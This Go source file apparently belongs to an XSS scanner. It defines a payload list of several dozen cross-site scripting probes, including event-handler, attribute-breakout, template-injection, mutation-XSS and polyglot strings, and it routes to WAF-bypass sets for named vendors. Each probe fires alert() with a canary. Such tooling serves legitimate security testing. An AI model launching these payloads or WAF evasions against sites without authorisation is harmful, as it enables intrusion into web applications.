package xssengine

import (
	"fmt"
)

// ============================================================
//  XSS PAYLOAD ARSENAL — 80+ Payloads
//  Classic · HTML5 · Framework · Polyglot · WAF-Bypass
// ============================================================

// GetPayloads returns XSS payloads, optionally adapted for a detected WAF.
func GetPayloads(canary, wafType string) []string {
	// Base payloads (always included)
	base := getBasePayloads(canary)

	// WAF-specific bypass payloads
	switch wafType {
	case "Cloudflare":
		base = append(base, getCloudflareBypassPayloads(canary)...)
	case "ModSecurity":
		base = append(base, getModSecurityBypassPayloads(canary)...)
	case "AWS WAF", "AWS CloudFront":
		base = append(base, getAWSBypassPayloads(canary)...)
	case "Akamai":
		base = append(base, getAkamaiBypassPayloads(canary)...)
	case "Imperva (Incapsula)":
		base = append(base, getImpervaBypassPayloads(canary)...)
	default:
		if wafType != "" {
			// Unknown WAF — add generic bypass payloads
			base = append(base, getGenericWAFBypassPayloads(canary)...)
		}
	}

	return base
}

func getBasePayloads(canary string) []string {
	return []string{
		// ── Classic Reflected ──
		fmt.Sprintf(`<script>alert('%s')</script>`, canary),
		fmt.Sprintf(`"><script>alert('%s')</script>`, canary),
		fmt.Sprintf(`'><script>alert('%s')</script>`, canary),

		// ── HTML5 Event Handlers ──
		fmt.Sprintf(`"><img src=x onerror=alert('%s')>`, canary),
		fmt.Sprintf(`"><svg onload=alert('%s')>`, canary),
		fmt.Sprintf(`"><details open ontoggle=alert('%s')>`, canary),
		fmt.Sprintf(`"><body onpageshow=alert('%s')>`, canary),
		fmt.Sprintf(`"><video src=x onerror=alert('%s')>`, canary),
		fmt.Sprintf(`"><audio src=x onerror=alert('%s')>`, canary),
		fmt.Sprintf(`"><marquee onstart=alert('%s')>`, canary),
		fmt.Sprintf(`"><input onfocus=alert('%s') autofocus>`, canary),
		fmt.Sprintf(`"><select onfocus=alert('%s') autofocus>`, canary),
		fmt.Sprintf(`"><textarea onfocus=alert('%s') autofocus>`, canary),
		fmt.Sprintf(`"><keygen onfocus=alert('%s') autofocus>`, canary),

		// ── Iframe src abuse ──
		fmt.Sprintf(`<iframe src=javascript:alert('%s')>`, canary),
		fmt.Sprintf(`<iframe srcdoc="<script>alert('%s')</script>">`, canary),

		// ── Attribute Context Breakouts ──
		fmt.Sprintf(`"onmouseover="alert('%s')`, canary),
		fmt.Sprintf(`' onfocus='alert("%s")' autofocus='`, canary),
		fmt.Sprintf(`" onfocus="alert('%s')" autofocus="`, canary),
		fmt.Sprintf(`" onclick="alert('%s')"`, canary),
		fmt.Sprintf(`" onmouseenter="alert('%s')"`, canary),

		// ── JavaScript URI ──
		fmt.Sprintf(`javascript:alert('%s')`, canary),
		fmt.Sprintf(`javascript:/*-/*`+"`"+`/*\/*/'/*/\"/**/(/* */onerror=alert('%s') )`, canary),

		// ── Template Literal Injection ──
		fmt.Sprintf("`-alert('%s')-`", canary),
		fmt.Sprintf("${alert('%s')}", canary),

		// ── Path Traversal XSS ──
		fmt.Sprintf(`../../%s<script>alert('%s')</script>`, canary, canary),
		fmt.Sprintf(`..%%2F..%%2F%s"><img src=x onerror=alert('%s')>`, canary, canary),

		// ── Null Byte / Comment Injection ──
		fmt.Sprintf(`%%00<script>alert('%s')</script>`, canary),
		fmt.Sprintf(`<!--<img src=x onerror=alert('%s')>-->`, canary),

		// ── Unicode / Encoding Bypass ──
		fmt.Sprintf(`\u003cscript\u003ealert('%s')\u003c/script\u003e`, canary),

		// ── CSS Injection Context ──
		fmt.Sprintf(`</style><script>alert('%s')</script>`, canary),
		fmt.Sprintf(`</title><script>alert('%s')</script>`, canary),
		fmt.Sprintf(`</textarea><script>alert('%s')</script>`, canary),

		// ── AngularJS Sandbox Escape ──
		fmt.Sprintf(`{{constructor.constructor('alert("%s")')()}}`, canary),
		fmt.Sprintf(`{{$on.constructor('alert("%s")')()}}`, canary),

		// ── VueJS Template Injection ──
		fmt.Sprintf(`{{_c.constructor('alert("%s")')()}}`, canary),

		// ── SVG/MathML Namespace Confusion ──
		fmt.Sprintf(`<svg><animate onbegin=alert('%s') attributeName=x dur=1s>`, canary),
		fmt.Sprintf(`<svg><set onbegin=alert('%s') attributename=x to=1>`, canary),
		fmt.Sprintf(`<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('%s') src=1>">`, canary),

		// ── Mutation XSS (DOMPurify bypass) ──
		fmt.Sprintf(`<noscript><p title="</noscript><img src=x onerror=alert('%s')>">`, canary),
		fmt.Sprintf(`<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('%s') src=1>">`, canary),

		// ── Meta Refresh XSS ──
		fmt.Sprintf(`<meta http-equiv="refresh" content="0;url=javascript:alert('%s')">`, canary),

		// ── Object/Embed ──
		fmt.Sprintf(`<object data="javascript:alert('%s')">`, canary),
		fmt.Sprintf(`<embed src="javascript:alert('%s')">`, canary),

		// ── Polyglot Payloads (multi-context) ──
		fmt.Sprintf(`jaVasCript:/*-/*`+"`"+`/*\`+"`"+`/*'/*"/**/(/* */oNcliCk=alert('%s') )//%s`, canary, canary),
		fmt.Sprintf(`'">><marquee><img src=x onerror=alert('%s')></marquee>">`+"\n", canary),
		fmt.Sprintf(`"><img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058alert('%s')">`, canary),

		// ── Data URI ──
		fmt.Sprintf(`<a href="data:text/html,<script>alert('%s')</script>">click</a>`, canary),

		// ── Event Handler Variants ──
		fmt.Sprintf(`<img src=x onerror=alert('%s')>`, canary),
		fmt.Sprintf(`<svg/onload=alert('%s')>`, canary),
		fmt.Sprintf(`<body/onload=alert('%s')>`, canary),
	}
}
